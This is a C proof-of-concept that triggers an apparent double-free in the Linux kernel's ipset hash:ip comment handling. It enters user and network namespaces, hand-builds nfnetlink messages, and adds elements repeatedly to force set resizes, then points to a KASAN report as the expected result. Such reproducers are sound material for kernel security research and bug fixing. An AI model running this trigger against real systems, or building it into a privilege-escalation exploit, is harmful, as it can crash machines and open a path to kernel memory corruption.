// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/netfilter/nfnetlink.h>

#define NFNL_SUBSYS_IPSET       6
#define IPSET_CMD_CREATE        2
#define IPSET_CMD_DESTROY       3
#define IPSET_CMD_ADD           9

#define IPSET_ATTR_PROTOCOL     1
#define IPSET_ATTR_SETNAME      2
#define IPSET_ATTR_TYPENAME     3
#define IPSET_ATTR_REVISION     4
#define IPSET_ATTR_FAMILY       5
#define IPSET_ATTR_DATA         7

#define IPSET_ATTR_IP           1
#define IPSET_ATTR_CADT_FLAGS   8
#define IPSET_ATTR_HASHSIZE     18
#define IPSET_ATTR_MAXELEM      19
#define IPSET_ATTR_BUCKETSIZE   21
#define IPSET_ATTR_COMMENT      26
#define IPSET_ATTR_IPADDR_IPV4  1

#define IPSET_FLAG_WITH_COMMENT (1 << 4)
#define NLA_F_NESTED            (1 << 15)
#define NLA_F_NET_BYTEORDER     (1 << 14)
#define IPSET_PROTOCOL          7

static int nlfd = -1;
static uint32_t nlseq = 1;

static int nl_open(void) {
    nlfd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (nlfd < 0) { perror("socket(NL)"); return -1; }
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    bind(nlfd, (struct sockaddr *)&sa, sizeof(sa));
    int one = 1;
    setsockopt(nlfd, SOL_NETLINK, NETLINK_EXT_ACK, &one, sizeof(one));
    return 0;
}

static int nl_send_recv(void *buf, int len) {
    if (send(nlfd, buf, len, 0) < 0) { perror("nl send"); return -1; }
    char rbuf[8192];
    int r = recv(nlfd, rbuf, sizeof(rbuf), 0);
    if (r < 0) { perror("nl recv"); return -1; }
    struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;
    if (rh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *err = (struct nlmsgerr *)(rh + 1);
        return err->error;
    }
    return r;
}

static int nla_u8(char *b, int p, int type, uint8_t v) {
    *(uint16_t*)(b+p)=5; *(uint16_t*)(b+p+2)=type; *(uint8_t*)(b+p+4)=v;
    return p+8;
}
static int nla_u32be(char *b, int p, int type, uint32_t v) {
    *(uint16_t*)(b+p)=8; *(uint16_t*)(b+p+2)=type|NLA_F_NET_BYTEORDER;
    *(uint32_t*)(b+p+4)=htonl(v); return p+8;
}
static int nla_str(char *b, int p, int type, const char *s) {
    int l=strlen(s)+1; *(uint16_t*)(b+p)=4+l; *(uint16_t*)(b+p+2)=type;
    memcpy(b+p+4,s,l); return p+((4+l+3)&~3);
}
static int nla_ipv4(char *b, int p, uint32_t ip_net) {
    int s=p; *(uint16_t*)(b+p)=0; *(uint16_t*)(b+p+2)=IPSET_ATTR_IP|NLA_F_NESTED;
    p+=4;
    *(uint16_t*)(b+p)=8; *(uint16_t*)(b+p+2)=IPSET_ATTR_IPADDR_IPV4|NLA_F_NET_BYTEORDER;
    *(uint32_t*)(b+p+4)=ip_net; p+=8;
    *(uint16_t*)(b+s)=p-s; return p;
}
static int msg_start(char *b, int cmd) {
    memset(b, 0, 512);
    struct nlmsghdr *n=(struct nlmsghdr*)b;
    n->nlmsg_type=(NFNL_SUBSYS_IPSET<<8)|cmd;
    n->nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK;
    n->nlmsg_seq=nlseq++;
    int p=((int)sizeof(struct nlmsghdr)+3)&~3;
    struct nfgenmsg *g=(struct nfgenmsg*)(b+p);
    g->nfgen_family=AF_INET; g->version=0; g->res_id=0;
    p+=sizeof(struct nfgenmsg); p=(p+3)&~3;
    return p;
}

static const char *SETNAME = "race";

static int ipset_create(int hashsize) {
    char b[512]; int p=msg_start(b, IPSET_CMD_CREATE);
    p=nla_u8(b,p,IPSET_ATTR_PROTOCOL,IPSET_PROTOCOL);
    p=nla_str(b,p,IPSET_ATTR_SETNAME,SETNAME);
    p=nla_str(b,p,IPSET_ATTR_TYPENAME,"hash:ip");
    p=nla_u8(b,p,IPSET_ATTR_REVISION,6);
    p=nla_u8(b,p,IPSET_ATTR_FAMILY,AF_INET);
    int ds=p; *(uint16_t*)(b+p)=0; *(uint16_t*)(b+p+2)=IPSET_ATTR_DATA|NLA_F_NESTED; p+=4;
    p=nla_u32be(b,p,IPSET_ATTR_HASHSIZE,hashsize);
    p=nla_u32be(b,p,IPSET_ATTR_MAXELEM,65536);
    p=nla_u32be(b,p,IPSET_ATTR_CADT_FLAGS,IPSET_FLAG_WITH_COMMENT);

    p=nla_u8(b,p,IPSET_ATTR_BUCKETSIZE,2);
    *(uint16_t*)(b+ds)=p-ds;
    ((struct nlmsghdr*)b)->nlmsg_len=p;
    return nl_send_recv(b,p);
}

static int ipset_destroy(void) {
    char b[512]; int p=msg_start(b, IPSET_CMD_DESTROY);
    p=nla_u8(b,p,IPSET_ATTR_PROTOCOL,IPSET_PROTOCOL);
    p=nla_str(b,p,IPSET_ATTR_SETNAME,SETNAME);
    ((struct nlmsghdr*)b)->nlmsg_len=p;
    return nl_send_recv(b,p);
}

static int ipset_add(uint32_t ip_net, const char *comment) {
    char b[512]; int p=msg_start(b, IPSET_CMD_ADD);
    p=nla_u8(b,p,IPSET_ATTR_PROTOCOL,IPSET_PROTOCOL);
    p=nla_str(b,p,IPSET_ATTR_SETNAME,SETNAME);
    int ds=p; *(uint16_t*)(b+p)=0; *(uint16_t*)(b+p+2)=IPSET_ATTR_DATA|NLA_F_NESTED; p+=4;
    p=nla_ipv4(b,p,ip_net);
    if (comment) p=nla_str(b,p,IPSET_ATTR_COMMENT,comment);
    *(uint16_t*)(b+ds)=p-ds;
    ((struct nlmsghdr*)b)->nlmsg_len=p;
    return nl_send_recv(b,p);
}

int main(void)
{
    printf("[*] ipset comment double-free PoC\n");
    printf("[*] Kernel has race simulation patch in mtype_resize\n\n");

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
        perror("unshare (non-fatal, trying as root)");

    if (nl_open() < 0) return 1;

    for (int round = 0; round < 10; round++) {
        printf("=== Round %d ===\n", round);

        ipset_destroy();

        int ret = ipset_create(4);
        if (ret < 0) {
            printf("[!] create failed: %d\n", ret);
            return 1;
        }
        printf("[+] Set created (hashsize=4, comments enabled)\n");

        for (int i = 1; i <= 3; i++) {
            uint32_t ip = htonl(0x0A000000 + round * 256 + i);
            char c[64];
            snprintf(c, sizeof(c), "comment_target_%d_%d", round, i);
            ret = ipset_add(ip, c);
            if (ret < 0)
                printf("[!] add %d.%d.%d.%d: %d\n",
                       10, 0, round, i, ret);
        }

        printf("[*] Adding elements to trigger resize...\n");
        for (int i = 0; i < 100; i++) {
            uint32_t ip = htonl(0xC0A80000 + round * 1000 + i);
            char c[64];
            snprintf(c, sizeof(c), "filler_%d_%d", round, i);
            ipset_add(ip, c);
        }
        printf("[*] Round %d done\n", round);
    }

    printf("\n[*] All rounds done.\n");
    printf("[*] If KASAN is enabled, double-free should be detected.\n");
    printf("[*] Check dmesg/serial output for KASAN report.\n");
    return 0;
}
